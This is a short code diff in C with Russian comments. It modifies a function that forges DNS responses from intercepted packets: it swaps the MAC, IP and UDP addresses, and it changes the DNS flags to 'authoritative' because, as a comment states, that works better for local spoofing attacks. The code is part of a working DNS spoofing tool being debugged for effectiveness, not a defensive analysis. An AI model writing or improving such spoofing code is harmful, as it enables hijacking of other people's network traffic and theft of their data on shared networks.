@@ -140,36 +140,43 @@ uint16_t compute_udp_checksum(struct iphdr* ip, struct udphdr* udp) {
 }
 
 Packet create_simple_dns_response(Packet input) {
-    static int name_index = 0;
+static int name_index = 0;
 
-    // 1. Подготовка буфера
     Packet response;
-    // Выделяем с запасом, но в конце обрежем до точного размера
+    // Выделяем память
     response.buffer = malloc(ETH_FRAME_LEN); 
-    
-    // Копируем исходный пакет (чтобы сохранить Transaction ID и заголовки)
     memcpy(response.buffer, input.buffer, input.size);
+
+    // --- ИСПРАВЛЕНИЕ 1: SWAP MAC ADDRESSES ---
+    struct ethhdr* eth = (struct ethhdr*)response.buffer;
+    uint8_t tmp_mac[ETH_ALEN];
+    // Меняем местами Source и Dest MAC
+    memcpy(tmp_mac, eth->h_dest, ETH_ALEN);
+    memcpy(eth->h_dest, eth->h_source, ETH_ALEN);
+    memcpy(eth->h_source, tmp_mac, ETH_ALEN);
+    // ----------------------------------------
 
     struct iphdr* ip = (struct iphdr*)(response.buffer + sizeof(struct ethhdr));
     struct udphdr* udp = (struct udphdr*)(response.buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
 
-    // 2. Swap IP addresses
+    // Swap IP addresses
     uint32_t tmp_ip = ip->saddr;
     ip->saddr = ip->daddr;
     ip->daddr = tmp_ip;
 
-    // 3. Swap UDP ports
+    // Swap UDP ports
     uint16_t tmp_port = UDP_SOURCE(udp);
     UDP_SOURCE(udp) = UDP_DEST(udp);
     UDP_DEST(udp) = tmp_port;
 
-    // 4. Работа с DNS данными
     char* dns_data = (char*)(response.buffer + sizeof(struct ethhdr) + 
                              sizeof(struct iphdr) + sizeof(struct udphdr));
 
-    // Flags: Standard Response, No Error (0x8180)
+    // --- ИСПРАВЛЕНИЕ 2: FLAGS ---
+    // Flags: Response (0x8000) + Authoritative (0x0400) + No Error (0x0000) + Recursion Desired (0x0100) + RA (0x0080)
+    // Обычно 0x8580 (Authoritative) работает лучше, чем 0x8180, для локальных спуфинг-атак
     uint16_t* dns_flags = (uint16_t*)(dns_data + 2);
-    *dns_flags = htons(0x8180);
+    *dns_flags = htons(0x8580);
 
     // Answers count: 1
     uint16_t* dns_answers = (uint16_t*)(dns_data + 6);
